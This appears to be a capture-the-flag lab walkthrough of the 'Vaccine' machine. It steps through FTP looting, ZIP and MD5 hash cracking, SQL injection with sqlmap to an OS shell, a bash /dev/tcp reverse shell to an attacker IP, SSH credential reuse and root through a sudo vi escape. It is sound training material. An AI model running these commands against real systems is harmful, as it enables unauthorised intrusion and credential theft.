# Vaccine Machine

## Initial Enumeration

- Ran full port and service/version scan:
  ```bash
  nmap -p- -sV -sC 10.129.95.174
  ```
- Discovered services:
  - 21/tcp - FTP (Anonymous login allowed)
  - 22/tcp - SSH
  - 80/tcp - HTTP

## FTP Access

- Connected to FTP using anonymous login.
  ```bash
  ftp 10.129.95.174
  ```
- Found and downloaded a file:
  ```bash
  get backup.zip
  ```

## Cracking ZIP Password

- Found the zip file is password protected.
- Converted to hash format:
  ```bash
  zip2john backup.zip > backup.hash
  ```
- Cracked using John and rockyou:
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
  ```
- Got the ZIP password: **[REDACTED]**

## Inspecting ZIP Contents

- Extracted `backup.zip`, found:
  - `index.php`
  - `style.css`

- In `index.php`, found:
  - Username: `admin`
  - Password: **[REDACTED]** (hashed)

## Cracking the Hashed Password

- Checked the hash type using:
  ```bash
  hashid <hash>
  ```
  - Multiple results returned, but assumed **MD5** (32-character hash).

- Cracked using Hashcat:
  ```bash
  hashcat -a 0 -m 0 password.hash /usr/share/wordlists/rockyou.txt
  ```
- Recovered password: **[REDACTED]**

## Logging into the Web App

- Logged into the web app using:
  ```
  http://10.129.95.174
  ```
- Credentials:
  - Username: `admin`
  - Password: **[REDACTED]**

- Found a **search** functionality — possible injection point.

## SQL Injection

- Tested with a single `'` — saw:
  ```
  ERROR: unterminated quoted string at or near "'"
  LINE 1: Select * from cars where name ilike '%'%' ^
  ```
- Indicates **PostgreSQL** and SQL Injection.

- Used SQLMap to confirm:
  ```bash
  sqlmap -u 'http://10.129.95.174/dashboard.php?search=anyquery' --cookie="PHPSESSID=[REDACTED]"
  ```
- Confirmed injection and **DBA rights**.

- Used SQLMap to get OS shell:
  ```bash
  sqlmap -u 'http://10.129.95.174/dashboard.php?search=anyquery' --cookie="PHPSESSID=[REDACTED]" --os-shell
  ```

## Getting a Reverse Shell

1. Opened a listener:
   ```bash
   sudo nc -lvnp 443
   ```

2. Sent command via SQLMap shell:
   ```bash
   bash -c "bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1"
   ```

3. Got reverse shell.

## Privilege Escalation

- Checked `/var/www/html` for credentials.
- Found DB password: **[REDACTED]**

- Logged in via SSH:
  ```bash
  ssh postgres@10.129.95.174
  ```
- Used password found in PHP files.

- Found user flag: **[REDACTED]**

- Checked sudo privileges:
  ```bash
  sudo -l
  ```
  - Output:
    ```
    User postgres may run the following commands on vaccine:
      (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
    ```

## Root Privileges via `vi`

- Ran:
  ```bash
  sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
  ```
- Inside `vi`, used escape and shell:
  ```
  :!bash
  ```

- Got root shell access.
- Retrieved root/system flag: **[REDACTED]**
